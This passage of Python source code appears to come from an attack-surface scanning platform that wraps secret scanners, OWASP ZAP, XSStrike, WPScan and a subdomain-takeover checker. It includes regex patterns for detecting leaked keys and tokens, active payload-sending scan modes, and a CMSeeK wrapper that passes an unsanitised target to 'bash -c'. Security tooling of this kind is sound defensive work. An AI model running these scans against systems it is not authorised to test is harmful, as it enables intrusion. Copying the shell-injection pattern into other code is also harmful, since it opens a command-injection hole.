    unique_domains = sorted({d for d in discovered_domains if d})
    bridge.flush()
    return {
        "success": True,
        "mode": normalized_mode,
        "search_type": normalized_search_type,
        "terms": include_terms,
        "exclude": exclude_terms,
        "results": results,
        "domains": unique_domains[:max_domains],
        "domain_count": len(unique_domains),
    }


def run_argus(
    path: str,
    bridge: ASMBridge,
    validate: bool = False,
    timeout: int = 900,
) -> List[dict]:
    """
    Argus — Aegis Vanguard's all-seeing secrets scanner.

    Wraps Praetorian's `titus` CLI (487 detection rules, optional live
    credential validation) via asm_scanner_core.run_argus, and streams
    findings to the platform bridge tagged as `argus`.
    """
    try:
        from asm_scanner_core.scanners.argus import run_argus as core_run_argus
    except ImportError:
        logger.error("asm_scanner_core not installed; cannot run Argus"); return []
    if not _tool_available("titus"):
        logger.error("titus binary missing; cannot run Argus"); return []
    result = core_run_argus(path, validate=validate, timeout=timeout)
    for f in result.findings:
        bridge.submit_vulnerability(
            host=f.target or path,
            title=f.title or "Secret finding",
            severity=f.severity or "medium",
            source="argus",
            description=f.description or "",
        )
    bridge.flush()
    logger.info(f"Argus: {len(result.findings)} findings in {path}")
    return [f.to_dict() for f in result.findings]


def run_atlas(
    org: str,
    bridge: ASMBridge,
    domain: Optional[str] = None,
    asn: Optional[str] = None,
    mode: str = "passive",
    timeout: int = 900,
) -> Dict[str, Any]:
    """
    Atlas — Aegis Vanguard's attack-surface cartographer.

    Wraps Praetorian's `pius` CLI (24+ OSINT plugins across all 5 RIRs) via
    asm_scanner_core.run_atlas, and submits each discovered domain /
    subdomain / IP / CIDR to the platform through the bridge.
    """
    try:
        from asm_scanner_core.scanners.atlas import run_atlas as core_run_atlas
    except ImportError:
        logger.error("asm_scanner_core not installed; cannot run Atlas"); return {}
    if not _tool_available("pius"):
        logger.error("pius binary missing; cannot run Atlas"); return {}
    result = core_run_atlas(org=org, domain=domain, asn=asn, mode=mode, timeout=timeout)

    for d in result.domains:
        bridge.submit_domain(d, source="atlas")
    for s in result.subdomains:
        bridge.submit_subdomain(s, source="atlas")
    for c in result.cidrs:
        bridge.submit_finding(Finding(
            type="ip_range",
            source="atlas",
            target=c,
            title=f"CIDR: {c}",
            severity="info",
        ))
    bridge.flush()
    logger.info(
        f"Atlas: {len(result.domains)} domains, {len(result.subdomains)} subdomains, {len(result.cidrs)} CIDRs for {org}"
    )
    return {
        "org": org,
        "domains": len(result.domains),
        "subdomains": len(result.subdomains),
        "cidrs": len(result.cidrs),
        "errors": result.errors,
    }


def run_hermes(
    source: str,
    target: str,
    bridge: ASMBridge,
    only_verified: bool = False,
    timeout: int = 900,
    env: Optional[Dict[str, str]] = None,
) -> List[dict]:
    """
    Hermes — Aegis Vanguard's remote secrets-finder (wraps TruffleHog v3).

    Unlike Argus (local filesystem), Hermes hunts secrets in remote sources:
    GitHub/GitLab orgs, S3/GCS/Azure buckets, Docker images, Postman
    workspaces, Jenkins, Jira, Confluence, etc. Each finding is streamed to
    the platform bridge tagged as `hermes`.
    """
    try:
        from asm_scanner_core.scanners.hermes import run_hermes as core_run_hermes
    except ImportError:
        logger.error("asm_scanner_core not installed; cannot run Hermes"); return []
    if not _tool_available("trufflehog"):
        logger.error("trufflehog binary missing; cannot run Hermes"); return []

    result = core_run_hermes(
        source=source,
        target=target,
        only_verified=only_verified,
        timeout=timeout,
        env=env,
    )
    for f in result.findings:
        bridge.submit_vulnerability(
            host=f.target or target,
            title=f.title or "Secret finding",
            severity=f.severity or "medium",
            source="hermes",
            description=f.description or "",
        )
    bridge.flush()
    logger.info(f"Hermes: {len(result.findings)} findings from {source}:{target}")
    return [f.to_dict() for f in result.findings]


def run_janus(
    target_url: str,
    bridge: ASMBridge,
    mode: str = "baseline",
    minutes: Optional[int] = None,
    ajax: bool = False,
    timeout: int = 1800,
) -> Dict[str, Any]:
    """
    Janus — Aegis Vanguard's two-faced DAST gatekeeper (wraps OWASP ZAP).

    Baseline = passive spider + passive rules only (safe, continuous-monitoring
    friendly). Full = baseline + active attack scan (in-scope only — sends
    real payloads). Streams each ZAP alert to the bridge tagged `janus`.
    """
    try:
        from asm_scanner_core.scanners.janus import run_janus as core_run_janus
    except ImportError:
        logger.error("asm_scanner_core not installed; cannot run Janus"); return {}

    zap_available = (
        _tool_available("zap-baseline.py")
        or _tool_available("zap-full-scan.py")
        or _tool_available("zap.sh")
        or _tool_available("docker")
    )
    if not zap_available:
        logger.error("OWASP ZAP not available; cannot run Janus"); return {}

    result = core_run_janus(
        target_url=target_url,
        mode=mode,
        minutes=minutes,
        ajax=ajax,
        timeout=timeout,
    )
    for f in result.findings:
        bridge.submit_vulnerability(
            host=f.host or f.target or target_url,
            title=f.title or "ZAP alert",
            severity=f.severity or "info",
            source="janus",
            description=f.description or "",
        )
    bridge.flush()
    logger.info(
        f"Janus ({mode}): {len(result.findings)} findings on {target_url}"
    )
    return {
        "target_url": target_url,
        "mode": mode,
        "findings": len(result.findings),
        "report_path": result.report_path,
        "errors": result.errors,
    }


def run_gitleaks(repo_path: str, bridge: ASMBridge, timeout: int = 300) -> List[dict]:
    """Secret scanning via gitleaks."""
    if not _tool_available("gitleaks"):
        logger.error("gitleaks not installed"); return []
    cmd = ["gitleaks", "detect", "--source", repo_path, "--report-format", "json", "--no-banner"]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        if isinstance(data, list):
            for leak in data:
                bridge.submit_vulnerability(
                    host=repo_path, title=f"Secret: {leak.get('RuleID', 'unknown')}",
                    severity="high", source="gitleaks",
                    description=f"File: {leak.get('File', '')} Line: {leak.get('StartLine', '')}",
                )
                findings.append(leak)
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"gitleaks: {len(findings)} secrets in {repo_path}")
    return findings


def _parse_js_secret_urls(urls: str) -> List[str]:
    if not urls or not str(urls).strip():
        return []
    out: List[str] = []
    for line in str(urls).replace(",", "\n").split("\n"):
        u = line.strip()
        if u.startswith("http://") or u.startswith("https://"):
            out.append(u)
    seen = set()
    uniq: List[str] = []
    for u in out:
        if u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def _js_filename(url: str) -> str:
    return hashlib.sha256(url.encode("utf-8")).hexdigest()[:20] + ".js"


def _regex_js_hints(js_content: str) -> Dict[str, List[str]]:
    """Lightweight patterns aligned with ASM KatanaService.extract_secrets_from_js."""
    hints: Dict[str, List[str]] = {
        "api_keys": [], "tokens": [], "passwords": [], "urls": [], "emails": [],
    }
    api_patterns = [
        r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']?apikey["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']?secret[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']?access[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']?auth[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)',
    ]
    for pattern in api_patterns:
        for match in re.findall(pattern, js_content, re.IGNORECASE):
            if len(match) > 8:
                hints["api_keys"].append(match)
    url_pattern = r'https?://[^\s"\'<>]+(?:/[^\s"\'<>]*)?'
    hints["urls"] = list(set(re.findall(url_pattern, js_content)))[:100]
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    hints["emails"] = list(set(re.findall(email_pattern, js_content)))[:50]
    return {k: v for k, v in hints.items() if v}


def run_js_url_secret_scan(
    urls: str,
    bridge: ASMBridge,
    max_urls: int = 30,
    max_bytes: int = 2 * 1024 * 1024,
    fetch_timeout: float = 35.0,
) -> Dict[str, Any]:
    """
    Download http(s) assets (typically .js from Katana), run gitleaks --no-git, regex hints.
    Submits gitleaks hits to the platform as vulnerabilities.
    """
    import httpx

    parsed = _parse_js_secret_urls(urls)[: max(1, min(int(max_urls), 100))]
    if not parsed:
        return {"success": False, "error": "No valid http(s) URLs", "urls_scanned": 0}

    if not _tool_available("gitleaks"):
        logger.error("gitleaks not installed")
        return {"success": False, "error": "gitleaks not installed", "urls_scanned": 0}

    downloads: List[Dict[str, Any]] = []
    regex_hints: List[Dict[str, Any]] = []

    with tempfile.TemporaryDirectory(prefix="js_secrets_") as tmp:
        files_dir = os.path.join(tmp, "files")
        os.makedirs(files_dir, exist_ok=True)
        name_to_url: Dict[str, str] = {}

        with httpx.Client(headers={"User-Agent": "Aegis-Vanguard-JS-Secrets/1.0"}) as client:
            for url in parsed:
                try:
                    with client.stream("GET", url, follow_redirects=True, timeout=fetch_timeout) as resp:
                        if resp.status_code != 200:
                            downloads.append({"url": url, "ok": False, "error": f"HTTP {resp.status_code}"})
                            continue
                        buf = bytearray()
                        for chunk in resp.iter_bytes():
                            buf.extend(chunk)
                            if len(buf) > max_bytes:
                                downloads.append({"url": url, "ok": False, "error": "content too large"})
                                break
                        else:
                            body = bytes(buf)
                            fname = _js_filename(url)
                            path = os.path.join(files_dir, fname)
                            with open(path, "wb") as f:
                                f.write(body)
                            name_to_url[fname] = url
                            text = body.decode("utf-8", errors="replace")
                            h = _regex_js_hints(text)
                            if h:
                                regex_hints.append({"url": url, "hints": h})
                            downloads.append({"url": url, "ok": True, "bytes": len(body), "file": fname})
                except Exception as e:
                    downloads.append({"url": url, "ok": False, "error": str(e)})

        gl_cmd = [
            "gitleaks", "detect",
            "--source", files_dir,
            "--no-git",
            "--report-format", "json",
            "--exit-code", "0",
            "--redact",
        ]
        proc = subprocess.run(gl_cmd, capture_output=True, text=True, timeout=300)
        raw = (proc.stdout or "").strip()
        gl_findings: List[dict] = []
        if raw:
            try:
                data = json.loads(raw)
                if isinstance(data, list):
                    gl_findings = data
                elif isinstance(data, dict):
                    gl_findings = [data]
            except json.JSONDecodeError:
                for line in raw.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        gl_findings.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue

        for finding in gl_findings:
            fn = (finding.get("File") or finding.get("file") or "").split("/")[-1]
            src = name_to_url.get(fn)
            if src:
                finding["source_url"] = src
            host = urlparse(src or "").hostname or (finding.get("source_url") or "unknown")
            rule = finding.get("RuleID") or finding.get("rule_id") or "secret"
            bridge.submit_vulnerability(
                host=host,
                title=f"JS secret ({rule})",
                severity="high",
                source="js_secrets",
                url=src or finding.get("source_url"),
                description=json.dumps({k: finding.get(k) for k in ("RuleID", "Secret", "Match", "StartLine", "EndLine") if finding.get(k)}, default=str),
                tags=["javascript", "secret", "gitleaks"],
            )
        bridge.flush()

    return {
        "success": True,
        "urls_requested": len(parsed),
        "urls_scanned": sum(1 for d in downloads if d.get("ok")),
        "downloads": downloads,
        "gitleaks_findings": gl_findings,
        "regex_hints": regex_hints,
    }


# =========================================================================
# jsluice — JavaScript URL / Secret Extraction (BishopFox)
# =========================================================================

def run_jsluice(js_urls: List[str], bridge: ASMBridge,
                fetch_timeout: int = 30, max_bytes: int = 5_000_000,
                tool_timeout: int = 120) -> Dict[str, Any]:
    """Fetch JavaScript files and extract URLs, paths, and secrets with jsluice.

    Uses AST-based analysis (go-tree-sitter) to find URLs passed to fetch(),
    XHR, document.location, etc., and scans for hardcoded secrets — more
    accurate than regex-only approaches.
    """
    try:
        import httpx
    except ImportError:
        return {"success": False, "error": "httpx not installed", "urls_scanned": 0}

    if not _tool_available("jsluice"):
        return {"success": False, "error": "jsluice not installed", "urls_scanned": 0}

    all_urls: List[Dict[str, Any]] = []
    all_secrets: List[Dict[str, Any]] = []
    download_results: List[Dict[str, Any]] = []

    with tempfile.TemporaryDirectory(prefix="jsluice_") as tmp:
        name_to_url: Dict[str, str] = {}

        with httpx.Client(
            headers={"User-Agent": "Mozilla/5.0 (compatible; AegisVanguard/1.0)"},
            follow_redirects=True,
            timeout=fetch_timeout,
        ) as client:
            for url in js_urls:
                try:
                    resp = client.get(url)
                    if resp.status_code != 200:
                        download_results.append({"url": url, "ok": False, "error": f"HTTP {resp.status_code}"})
                        continue
                    if len(resp.content) > max_bytes:
                        download_results.append({"url": url, "ok": False, "error": "too large"})
                        continue
                    safe_name = re.sub(r"[^\w.-]", "_", url.split("/")[-1] or "index") + ".js"
                    # avoid name collisions
                    safe_name = f"{hashlib.md5(url.encode()).hexdigest()[:8]}_{safe_name}"
                    path = os.path.join(tmp, safe_name)
                    with open(path, "wb") as fh:
                        fh.write(resp.content)
                    name_to_url[safe_name] = url
                    download_results.append({"url": url, "ok": True, "bytes": len(resp.content)})
                except Exception as exc:
                    download_results.append({"url": url, "ok": False, "error": str(exc)})

        for safe_name, source_url in name_to_url.items():
            js_path = os.path.join(tmp, safe_name)

            # Extract URLs
            try:
                proc = subprocess.run(
                    ["jsluice", "urls", js_path],
                    capture_output=True, text=True, timeout=tool_timeout,
                )
                for line in proc.stdout.strip().splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                    except json.JSONDecodeError:
                        entry = {"url": line}
                    entry["source_js"] = source_url
                    all_urls.append(entry)
            except subprocess.TimeoutExpired:
                logger.warning(f"jsluice urls timed out for {source_url}")
            except Exception as exc:
                logger.warning(f"jsluice urls error for {source_url}: {exc}")

            # Extract secrets
            try:
                proc = subprocess.run(
                    ["jsluice", "secrets", js_path],
                    capture_output=True, text=True, timeout=tool_timeout,
                )
                for line in proc.stdout.strip().splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                    except json.JSONDecodeError:
                        entry = {"raw": line}
                    entry["source_js"] = source_url
                    all_secrets.append(entry)

                    # Submit secrets as findings
                    host = urlparse(source_url).hostname or "unknown"
                    kind = entry.get("kind") or entry.get("type") or "js-secret"
                    severity = "high" if entry.get("severity") in ("high", "critical") else "medium"
                    bridge.submit_vulnerability(
                        host=host,
                        title=f"JS secret detected: {kind}",
                        severity=severity,
                        source="jsluice",
                        url=source_url,
                        description=json.dumps({k: entry.get(k) for k in ("kind", "data", "severity", "context") if entry.get(k)}, default=str),
                        tags=["javascript", "secret", "jsluice"],
                    )
            except subprocess.TimeoutExpired:
                logger.warning(f"jsluice secrets timed out for {source_url}")
            except Exception as exc:
                logger.warning(f"jsluice secrets error for {source_url}: {exc}")

    bridge.flush()

    logger.info(
        f"jsluice: {len(js_urls)} URLs → {len(all_urls)} endpoints, "
        f"{len(all_secrets)} secrets from {sum(1 for d in download_results if d.get('ok'))} files"
    )
    return {
        "success": True,
        "urls_scanned": sum(1 for d in download_results if d.get("ok")),
        "downloads": download_results,
        "extracted_urls": all_urls,
        "secrets": all_secrets,
        "extracted_url_count": len(all_urls),
        "secret_count": len(all_secrets),
    }


# =========================================================================
# CMS Detection
# =========================================================================

def run_cmseek(target: str, bridge: ASMBridge, timeout: int = 300) -> Optional[str]:
    """CMS detection via CMSeeK."""
    if not _tool_available("cmseek") and not os.path.exists("/opt/cmseek/cmseek.py"):
        logger.error("cmseek not installed"); return None
    binary = "cmseek" if _tool_available("cmseek") else "python3 /opt/cmseek/cmseek.py"
    cmd = ["bash", "-c", f"{binary} -u {target} --batch"]
    result = _run(cmd, timeout=timeout)
    cms = None
    for line in result.stdout.splitlines():
        if "CMS:" in line or "Detected CMS" in line:
            cms = line.split(":")[-1].strip()
            bridge.submit_finding(Finding(
                type="technology", source="cmseek", target=target,
                host=target, title=f"CMS Detected: {cms}",
                technologies=[cms], severity="info",
            ))
    bridge.flush()
    logger.info(f"cmseek: {'CMS=' + cms if cms else 'No CMS'} on {target}")
    return cms


def run_wpscan(target: str, bridge: ASMBridge, timeout: int = 600) -> List[dict]:
    """WordPress vulnerability scanning via wpscan."""
    if not _tool_available("wpscan"):
        logger.error("wpscan not installed"); return []
    cmd = ["wpscan", "--url", target, "--format", "json", "--no-banner"]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        for vuln in data.get("interesting_findings", []):
            bridge.submit_vulnerability(
                host=target, title=vuln.get("type", "WPScan Finding"),
                severity="medium", source="wpscan",
                url=vuln.get("url"), description=str(vuln.get("references", "")),
            )
            findings.append(vuln)
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"wpscan: {len(findings)} findings on {target}")
    return findings


def _resolve_xsstrike() -> Optional[str]:
    """Locate XSStrike entrypoint across Docker and local installs."""
    candidates = [
        "/opt/xsstrike/xsstrike.py",
        os.path.expanduser("~/XSStrike/xsstrike.py"),
        os.path.expanduser("~/.local/share/XSStrike/xsstrike.py"),
        shutil.which("xsstrike"),
    ]
    for path in candidates:
        if path and os.path.exists(path):
            return path
    return None


def run_xsstrike(target_url: str, bridge: ASMBridge, timeout: int = 300) -> List[dict]:
    """XSS detection via XSStrike with structured findings."""
    xsstrike_path = _resolve_xsstrike()
    if not xsstrike_path:
        logger.error("xsstrike not installed")
        return []

    if xsstrike_path.endswith(".py"):
        cmd = ["python3", xsstrike_path, "-u", target_url, "--skip", "--blind"]
    else:
        cmd = [xsstrike_path, "-u", target_url, "--skip", "--blind"]

    try:
        result = _run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        logger.warning("xsstrike timed out on %s", target_url)
        return []

    output = (result.stdout or "") + "\n" + (result.stderr or "")
    findings: List[dict] = []
    host = urlparse(target_url).hostname or target_url

    # XSStrike prints payloads and "Vulnerable webpage" / efficiency scores
    hit = bool(re.search(
        r"Vulnerable webpage|efficiency:\s*[5-9]\d|Payload:\s*<|XSS\s+found",
        output,
        re.I,
    ))
    # Avoid false positives from the banner alone ("XSStrike")
    if not hit and re.search(r"\b(Confirmed|Successful)\b", output, re.I):
        hit = True

    payloads = re.findall(r"Payload:\s*(.+)", output)
    if hit or payloads:
        payload_sample = (payloads[0] if payloads else "").strip()[:300]
        title = "Reflected XSS Detected"
        bridge.submit_vulnerability(
            host=host,
            title=title,
            severity="high",
            source="xsstrike",
            url=target_url,
            description=(output[-2000:] if output else "XSStrike reported XSS"),
            confidence="confirmed" if hit else "high",
            tags=["xss", "reflected-xss", "xsstrike"],
        )
        findings.append({
            "title": title,
            "name": title,
            "url": target_url,
            "matched_at": target_url,
            "severity": "high",
            "vuln_type": "xss",
            "type": "xss",
            "vulnerable": True,
            "confirmed": bool(hit),
            "source": "xsstrike",
            "payload": payload_sample,
            "evidence": output[-800:],
        })
        bridge.flush()

    logger.info("xsstrike: %d XSS on %s", len(findings), target_url)
    return findings


# =========================================================================
# Subdomain Takeover Detection
# =========================================================================

TAKEOVER_FINGERPRINTS = {
    "github.io": ("GitHub Pages", "There isn't a GitHub Pages site here"),
    "herokuapp.com": ("Heroku", "No such app"),
    "pantheonsite.io": ("Pantheon", "404 error unknown site"),
    "ghost.io": ("Ghost", "The thing you were looking for is no longer here"),
    "myshopify.com": ("Shopify", "Sorry, this shop is currently unavailable"),
    "surge.sh": ("Surge.sh", "project not found"),
    "bitbucket.io": ("Bitbucket", "Repository not found"),
    "wordpress.com": ("WordPress.com", "Do you want to register"),
    "teamwork.com": ("Teamwork", "Oops - We didn't find your site"),
    "helpjuice.com": ("Helpjuice", "We could not find what you're looking for"),
    "helpscoutdocs.com": ("HelpScout", "No settings were found for this company"),
    "s3.amazonaws.com": ("AWS S3", "NoSuchBucket"),
    "cloudfront.net": ("CloudFront", "ERROR: The request could not be satisfied"),
    "elasticbeanstalk.com": ("AWS Elastic Beanstalk", ""),
    "azurewebsites.net": ("Azure", "404 Web Site not found"),
    "cloudapp.net": ("Azure", ""),
    "trafficmanager.net": ("Azure Traffic Manager", ""),
    "blob.core.windows.net": ("Azure Blob", "BlobNotFound"),
    "zendesk.com": ("Zendesk", "Help Center Closed"),
    "fastly.net": ("Fastly", "Fastly error: unknown domain"),
    "smugmug.com": ("SmugMug", ""),
    "strikingly.com": ("Strikingly", "page not found"),
    "webflow.io": ("Webflow", "The page you are looking for doesn't exist"),
    "creatorlink.net": ("CreatorLink", ""),
    "tave.com": ("Tave", ""),
    "wishpond.com": ("Wishpond", ""),
    "aftership.com": ("AfterShip", "Oops.</h2>"),
    "aha.io": ("Aha!", "There is no portal here"),
    "tictail.com": ("Tictail", "to target URL"),
    "campaignmonitor.com": ("Campaign Monitor", "Trying to access your account"),
    "cargocollective.com": ("Cargo", "If you're moving your domain away"),
    "statuspage.io": ("Statuspage", "You are being redirected"),
    "tumblr.com": ("Tumblr", "There's nothing here"),
    "feedpress.me": ("FeedPress", "The feed has not been found"),
    "readme.io": ("Readme.io", "Project doesnt exist"),
    "fly.io": ("Fly.io", "404 Not Found"),
    "netlify.app": ("Netlify", "Not Found"),
    "vercel.app": ("Vercel", "NOT_FOUND"),
    "firebaseapp.com": ("Firebase", "404. That's an error"),
    "gitbook.io": ("GitBook", ""),
    "ngrok.io": ("ngrok", "Tunnel not found"),
    "desk.com": ("Desk.com", "Please try again or try Desk.com free"),
    "freshdesk.com": ("Freshdesk", "May be this is still fresh"),
    "unbounce.com": ("Unbounce", "The requested URL was not found"),
    "launchrock.com": ("LaunchRock", "It looks like you may have taken a wrong turn"),
    "pingdom.com": ("Pingdom", "Public Report Not Activated"),
    "tilda.cc": ("Tilda", "Please renew your subscription"),
    "canny.io": ("Canny", "Company Not Found"),
    "getresponse.com": ("GetResponse", "With GetResponse Landing Pages"),
    "acquia-test.co": ("Acquia", "Web Site Not Found"),
    "proposify.biz": ("Proposify", "If you need immediate assistance"),
    "simplebooklet.com": ("Simplebooklet", "We can't find this SimpleBoo"),
    "agilecrm.com": ("Agile CRM", "Sorry, this page is no longer available"),
    "airee.ru": ("Airee.ru", "Ошибка 402. Оплата за хостинг сайта"),
}


def run_subdomain_takeover(
    hosts: List[str], bridge: ASMBridge, timeout: int = 300,
) -> List[dict]:
    """Check subdomains for potential takeover via dangling CNAME fingerprints."""
    import subprocess as sp

    findings = []
    for host in hosts:
        try:
            dig = sp.run(
                ["dig", "+short", "CNAME", host], capture_output=True, text=True, timeout=15,
            )
            cname = dig.stdout.strip().rstrip(".")
        except Exception:
            cname = ""

        if not cname:
            bridge.submit_takeover(host, status="safe", source="takeover-check")
            continue

        matched_service = None
        matched_fingerprint = None
        for pattern, (service, fingerprint) in TAKEOVER_FINGERPRINTS.items():
            if pattern in cname.lower():
                matched_service = service
                matched_fingerprint = fingerprint
                break

        if not matched_service:
            bridge.submit_takeover(host, status="safe", cname_target=cname, source="takeover-check")
            findings.append({"host": host, "cname": cname, "status": "safe"})
            continue

        status = "potential"
        if matched_fingerprint:
            try:
                import urllib.request
                req = urllib.request.Request(f"http://{host}", method="GET")
                req.add_header("User-Agent", "Mozilla/5.0")
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read(8192).decode("utf-8", errors="ignore")
                if matched_fingerprint.lower() in body.lower():
                    status = "confirmed"
            except Exception:
                status = "potential"

        bridge.submit_takeover(
            host, status=status, service=matched_service,
            cname_target=cname, source="takeover-check",
        )
        findings.append({
            "host": host, "cname": cname, "service": matched_service, "status": status,
        })

    bridge.flush()
    confirmed = sum(1 for f in findings if f.get("status") == "confirmed")
    potential = sum(1 for f in findings if f.get("status") == "potential")
    logger.info(f"takeover: {confirmed} confirmed, {potential} potential across {len(hosts)} hosts")
    return findings


# =========================================================================
# TLS Deep Analysis (via tlsx)
# =========================================================================

def run_tlsx(
    hosts: List[str], bridge: ASMBridge, timeout: int = 300,
) -> List[dict]:
    """Deep TLS/SSL analysis via tlsx: cipher grading, cert scoring, key analysis."""
    if not _tool_available("tlsx"):
        logger.error("tlsx not installed"); return []

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hosts)); hosts_file = f.name
    try:
        cmd = [
            "tlsx", "-l", hosts_file, "-silent", "-json",
            "-cipher", "-hash", "sha256",
            "-expired", "-self-signed", "-mismatched",
            "-san", "-so", "-tps",
        ]
        result = _run(cmd, timeout=timeout)
        findings = []
        for line in result.stdout.strip().splitlines():
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            host = data.get("host", "")
            if not host:
                continue

            tls_version = data.get("tls_version", data.get("version", ""))
            cipher = data.get("cipher", "")

            cert_score = _grade_cert(data)
            key_algo = data.get("public_key_algorithm", "")
            key_size = data.get("public_key_size", 0)
            ca_type = "self-signed" if data.get("self_signed") else "ca-signed"

            days_left = None
            not_after = data.get("not_after", "")
            if not_after:
                try:
                    from datetime import datetime, timezone
                    expiry = datetime.fromisoformat(not_after.replace("Z", "+00:00"))
                    days_left = (expiry - datetime.now(timezone.utc)).days
                except Exception:
                    pass

            severity = "info"
            if cert_score in ("D", "F"):
                severity = "high"
            elif cert_score == "C":
                severity = "medium"
            elif data.get("expired") or data.get("self_signed") or data.get("mismatched"):
                severity = "high"

            bridge.submit_tls_analysis(
                host, source="tlsx",
                tls_version=tls_version,
                cipher_suite=cipher,
                cert_score=cert_score,
                key_algorithm=key_algo,
                key_size=key_size or None,
                ca_type=ca_type,
                cert_expiry_days=days_left,
                severity=severity,
                raw_data=data,
            )
            findings.append({
                "host": host, "grade": cert_score, "tls": tls_version,
                "cipher": cipher, "days_left": days_left,
            })
        bridge.flush()
        logger.info(f"tlsx: {len(findings)} hosts analyzed")
        return findings
    finally:
        os.unlink(hosts_file)


def _grade_cert(data: dict) -> str:
    """Heuristic A-F grade from tlsx output fields."""
    score = 100
    if data.get("expired"):
        score -= 50
    if data.get("self_signed"):
        score -= 40
    if data.get("mismatched"):
        score -= 30
    tls = data.get("tls_version", data.get("version", ""))
    if "1.0" in tls or "ssl" in tls.lower():
        score -= 30
    elif "1.1" in tls:
        score -= 15
    key_size = data.get("public_key_size", 0)
    if key_size and key_size < 2048:
        score -= 20
    if score >= 90:
        return "A"
    if score >= 80:
        return "B"
    if score >= 65:
        return "C"
    if score >= 50:
        return "D"
    return "F"


# =========================================================================
# Security Header Analysis
# =========================================================================

_REQUIRED_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
]


def run_security_headers(
    hosts: List[str], bridge: ASMBridge, timeout: int = 300,
) -> List[dict]:
    """Analyze security headers and CORS policy for live HTTP hosts via httpx."""
    if not _tool_available("httpx"):
        logger.error("httpx (PD) not installed"); return []

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hosts)); hosts_file = f.name
    try:
        cmd = [
            "httpx", "-l", hosts_file, "-silent", "-json",
            "-include-response-header",
        ]
        result = _run(cmd, timeout=timeout)
        findings = []
        for line in result.stdout.strip().splitlines():
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            url = data.get("url", "")
            host = data.get("host", data.get("input", ""))
            raw_headers = data.get("header", {})

            headers_lower = {k.lower(): v for k, v in raw_headers.items()} if raw_headers else {}

            sec_headers = {}
            for hdr in _REQUIRED_HEADERS:
                val = headers_lower.get(hdr)
                sec_headers[hdr] = val if val else None

            cors_policy = {}
            acao = headers_lower.get("access-control-allow-origin")
            if acao:
                cors_policy["allow_origin"] = acao
                cors_policy["wildcard"] = (acao == "*")
                acac = headers_lower.get("access-control-allow-credentials")
                cors_policy["allow_credentials"] = (acac and "true" in str(acac).lower())
                if cors_policy["wildcard"] and cors_policy["allow_credentials"]:
                    cors_policy["risky"] = True

            bridge.submit_security_headers(
                host, url=url, source="httpx",
                security_headers=sec_headers,
                cors_policy=cors_policy or None,
            )
            findings.append({
                "host": host, "url": url,
                "missing": [h for h, v in sec_headers.items() if not v],
                "cors": cors_policy,
            })
        bridge.flush()
        logger.info(f"security_headers: {len(findings)} hosts analyzed")
        return findings
    finally:
        os.unlink(hosts_file)


# =========================================================================
# Mail Infrastructure Intelligence
# =========================================================================

def run_mail_intel(
    domains: List[str], bridge: ASMBridge, timeout: int = 300,
) -> List[dict]:
    """Map MX, SPF, DKIM, DMARC, BIMI, MTA-STS, DANE per domain via dig."""
    import subprocess as sp
    findings = []
    for domain in domains:
        records: Dict[str, Any] = {}

        for rtype, key in [("MX", "mx"), ("TXT", "txt")]:
            try:
                r = sp.run(["dig", "+short", rtype, domain], capture_output=True, text=True, timeout=15)
                records[key] = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()]
            except Exception:
                records[key] = []

        txt_joined = " ".join(records.get("txt", []))
        records["spf"] = any("v=spf1" in t for t in records.get("txt", []))
        records["dmarc"] = False
        records["dkim"] = False
        records["bimi"] = False
        records["mta_sts"] = False
        records["dane"] = False

        for sub, key in [
            (f"_dmarc.{domain}", "dmarc"),
            (f"default._domainkey.{domain}", "dkim"),
            (f"default._bimi.{domain}", "bimi"),
            (f"_mta-sts.{domain}", "mta_sts"),
        ]:
            try:
                r = sp.run(["dig", "+short", "TXT", sub], capture_output=True, text=True, timeout=10)
                if r.stdout.strip():
                    records[key] = True
            except Exception:
                pass

        try:
            r = sp.run(["dig", "+short", "TLSA", f"_25._tcp.{domain}"], capture_output=True, text=True, timeout=10)
            if r.stdout.strip():
                records["dane"] = True
        except Exception:
            pass

        risk_score = _email_risk_score(records)
        provider = _detect_mail_provider(records.get("mx", []))

        bridge.submit_mail_intel(
            domain, source="dns-mail-intel",
            mail_records=records,
            mail_provider=provider,
            email_risk_score=risk_score,
        )
        findings.append({
            "domain": domain, "risk_score": risk_score,
            "provider": provider, "records": records,
        })
    bridge.flush()
    logger.info(f"mail_intel: {len(findings)} domains analyzed")
    return findings


def _email_risk_score(records: dict) -> int:
    """0-100 risk score: 0 = fully secured, 100 = no mail security at all."""
    score = 100
    if records.get("spf"):
        score -= 25
    if records.get("dkim"):
        score -= 25
    if records.get("dmarc"):
        score -= 25
    if records.get("bimi"):
        score -= 5
    if records.get("mta_sts"):
        score -= 10
    if records.get("dane"):
        score -= 10
    return max(0, score)


def _detect_mail_provider(mx_records: list) -> str:
    providers = {
